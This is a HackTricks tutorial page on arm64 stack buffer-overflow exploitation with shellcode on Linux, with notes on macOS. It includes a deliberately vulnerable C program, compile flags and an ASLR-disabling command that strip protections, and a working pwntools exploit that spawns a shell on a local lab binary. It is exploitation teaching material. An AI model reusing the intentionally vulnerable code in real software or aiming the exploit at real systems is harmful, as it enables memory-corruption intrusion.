---
title: "Stack Shellcode - arm64 (HackTricks)"
category: "pwn"
subcategory: "stack-shellcode"
type: "reference"
tags: ["hacktricks", "pwn", "buffer-overflow", "rop", "ret2win", "shellcode", "canary", "aslr", "pie", "ret2shellcode", "checksec", "fuzzing", "stack-shellcode", "stack", "stack-shellcode-arm64", "arm64"]
summary: "Find an introduction to arm64 in:"
source:
  name: "HackTricks"
  url: "https://github.com/HackTricks-wiki/hacktricks/blob/6df9a3d76fe6e74ffed6e6543b0a33313b88fcc2/src/binary-exploitation/stack-overflow/stack-shellcode/stack-shellcode-arm64.md"
license: "CC BY-NC 4.0"
---

# Stack Shellcode - arm64


Find an introduction to arm64 in:

../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md

## Linux

### Code
```c
#include <stdio.h>
#include <unistd.h>

void vulnerable_function() {
    char buffer[64];
    read(STDIN_FILENO, buffer, 256); // <-- bof vulnerability
}

int main() {
    vulnerable_function();
    return 0;
}
```

Compile without pie, canary, NX and AArch64 branch protection:
```bash
clang -o bof bof.c -fno-stack-protector -Wno-format-security -no-pie -z execstack -mbranch-protection=none
```

Quick sanity checks:
```bash
checksec --file ./bof
readelf -W -l ./bof | grep GNU_STACK
readelf --notes -W ./bof | grep -E 'AARCH64_FEATURE_1_(BTI|PAC)'
```

If you still see PAC/BTI notes or prologues such as `paciasp` / `autiasp`, the classic saved-`x30` overwrite may die before reaching your stack payload.<sup>[[2]](#references)</sup>

### AArch64 shellcode reminders

- Linux syscalls pass arguments in **`x0`** to **`x7`**, place the syscall number in **`x8`**, and trigger the transition with **`svc #0`**.<sup>[[1]](#references)</sup>
- AArch64 instructions are always **4 bytes**, so a NOP sled is usually repeated `nop` instructions (`0xd503201f`, bytes `\x1f\x20\x03\xd5`) instead of x86's single-byte `\x90`.
- Shellcode is usually **position independent** and commonly uses `adr` / `adrp` style addressing to reach embedded strings such as `/bin/sh`.<sup>[[1]](#references)</sup>

### No ASLR & No canary - Stack Overflow

To stop ASLR execute:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

To get the [**offset of the bof check this link**](https://github.com/HackTricks-wiki/hacktricks/blob/6df9a3d76fe6e74ffed6e6543b0a33313b88fcc2/src/binary-exploitation/stack-overflow/ret2win/ret2win-arm64.md#finding-the-offset).

Exploit:
```python
from pwn import *

# Load the binary
binary_name = './bof'
elf = context.binary = ELF(binary_name)
context.arch = 'aarch64'
context.os = 'linux'

# Generate shellcode
shellcode = asm(shellcraft.sh())
nop_sled = b"\x1f\x20\x03\xd5" * 32

# Start the process
p = process(binary_name)

# Offset to return address
offset = 72

# Address in the stack after the return address
ret_address = p64(0xfffffffff1a0)

# Craft the payload
payload = b'A' * offset + ret_address + nop_sled + shellcode

print("Payload length: "+ str(len(payload)))

# Send the payload
p.send(payload)

# Drop to an interactive session
p.interactive()
```

The only "complicated" thing to find here would be the address in the stack to call. In my case I generated the exploit with the address found using gdb, but then when exploiting it it didn't work (because the stack address changed a bit).

A practical workflow is:
```bash
ulimit -c unlimited
./bof < payload
gdb -q ./bof core
```

Then inspect the real landing address of the NOP sled / shellcode inside the generated **`core`** file. If you need to dump a core from a live inferior directly from GDB, `generate-core-file` / `gcore` is also handy.

If **NX** is enabled, ret2shellcode stops being the first choice. On ARM64 the common next step is to build a small [**ret2syscall**](https://github.com/HackTricks-wiki/hacktricks/blob/6df9a3d76fe6e74ffed6e6543b0a33313b88fcc2/src/binary-exploitation/rop-return-oriented-programing/rop-syscall-execv/ret2syscall-arm64.md) or `mprotect()` chain to flip a page to `RWX`, and then jump to the shellcode. Remember that `mprotect()` expects a **page-aligned** base address. For more context about NX bypasses, check [**this page**](https://github.com/HackTricks-wiki/hacktricks/blob/6df9a3d76fe6e74ffed6e6543b0a33313b88fcc2/src/binary-exploitation/common-binary-protections-and-bypasses/no-exec-nx.md).

On newer Armv8.5-A userlands (especially Android-focused labs), **MTE** can also break the *overflow stage itself*: tagged memory is checked per **16-byte granule**, and a tag mismatch can raise `SIGSEGV` before you ever pivot to shellcode. If a target exposes `HWCAP2_MTE` / `PROT_MTE`, treat it as a separate obstacle and check the dedicated [**MTE page**](https://github.com/HackTricks-wiki/hacktricks/blob/6df9a3d76fe6e74ffed6e6543b0a33313b88fcc2/src/binary-exploitation/common-binary-protections-and-bypasses/memory-tagging-extension-mte.md).

## macOS

> [!TIP]
> A normal macOS arm64 process cannot make its stack executable through the Linux `-z execstack` workflow. macOS enforces W^X/code-signing policy, and writable-to-executable transitions such as JIT mappings require platform-specific APIs and, for hardened applications, appropriate entitlements. Consequently, modern stack exploitation normally pivots to existing executable code (ROP/JOP) instead of raw stack shellcode.<sup>[[3]](#references)</sup>

Check a macOS ret2win example in:

../ret2win/ret2win-arm64.md

## References

- [1] [ARM64 Reversing And Exploitation Part 5 – Writing Shellcode](https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/)
- [2] [Enabling PAC and BTI on AArch64 for Linux](https://developer.arm.com/community/arm-community-blogs/b/architectures-and-processors-blog/posts/enabling-pac-and-bti-on-aarch64)
- [3] [Apple — Hardened Runtime](https://developer.apple.com/documentation/security/hardened-runtime)

---

## Source

HackTricks - <https://github.com/HackTricks-wiki/hacktricks/blob/6df9a3d76fe6e74ffed6e6543b0a33313b88fcc2/src/binary-exploitation/stack-overflow/stack-shellcode/stack-shellcode-arm64.md>

Mirrored into CTF-Brain at commit `6df9a3d76fe6`. Licence: CC BY-NC 4.0. The text is the original authors' work.
